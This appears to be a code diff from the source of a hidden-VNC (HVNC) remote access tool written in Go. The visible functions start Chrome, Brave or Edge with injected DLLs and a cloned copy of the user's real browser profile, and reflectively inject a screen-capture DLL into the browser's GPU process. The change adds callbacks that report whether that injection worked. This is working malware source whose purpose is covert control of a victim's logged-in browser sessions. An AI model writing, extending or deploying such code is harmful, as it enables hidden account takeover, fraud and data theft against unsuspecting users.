@@ -35,6 +35,9 @@ var (
 var advapi32 = syscall.NewLazyDLL("advapi32.dll")
 
 type CloneProgressFunc func(percent int, copiedBytes, totalBytes int64, status string)
+type DXGIStatusFunc func(success bool, gpuPID uint32, message string)
+
+var hvncDXGIStatusCallback atomic.Value
 
 const (
 	PROCESS_CREATE_THREAD     = 0x0002
@@ -125,7 +128,10 @@ func StartHVNCProcessInjected(filePath string, dllBytes []byte, captureDllBytes 
 // If clone is true, it clones the real profile so file I/O is redirected to the clone.
 // If clone is false, it starts the browser with injection but no path redirection.
 // browser should be one of: "chrome", "brave", "edge".
-func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc) error {
+func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc) error {
+	if onDXGIStatus != nil {
+		hvncDXGIStatusCallback.Store(onDXGIStatus)
+	}
 	info, ok := browserInfoMap[strings.ToLower(browser)]
 	if !ok {
 		return fmt.Errorf("unknown browser %q", browser)
@@ -194,7 +200,7 @@ func StartHVNCBrowserInjected(browser string, exePath string, dllBytes []byte, c
 
 // StartHVNCChromeInjected is kept for backward compatibility.
 func StartHVNCChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
-	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, nil)
+	return StartHVNCBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, nil, nil)
 }
 
 type browserInfo struct {
@@ -743,6 +749,9 @@ func hvncDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
 		if err := reflectiveInject(hProcess, captureDllBytes); err != nil {
 			log.Printf("hvnc inject: HVNCCapture DLL injection into GPU PID %d failed: %v", gpuPID, err)
 			procCloseHandle.Call(hProcess)
+			if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+				fn(false, gpuPID, fmt.Sprintf("DXGI injection failed for GPU PID %d", gpuPID))
+			}
 			return
 		}
 		procCloseHandle.Call(hProcess)
@@ -750,10 +759,16 @@ func hvncDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
 		log.Printf("hvnc inject: HVNCCapture DLL injected into GPU PID %d", gpuPID)
 		hvncRegisterInjectedPID(gpuPID)
 		hvncRegisterGPUPID(browserPID, gpuPID)
+		if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+			fn(true, gpuPID, fmt.Sprintf("DXGI capture active (GPU PID %d)", gpuPID))
+		}
 		return
 	}
 
 	log.Printf("hvnc inject: gave up finding GPU child for browser PID %d", browserPID)
+	if fn, ok := hvncDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
+		fn(false, 0, "DXGI injection failed: GPU process not found")
+	}
 }
 
 func findGPUChildProcess(parentPID uint32) (uint32, error) {
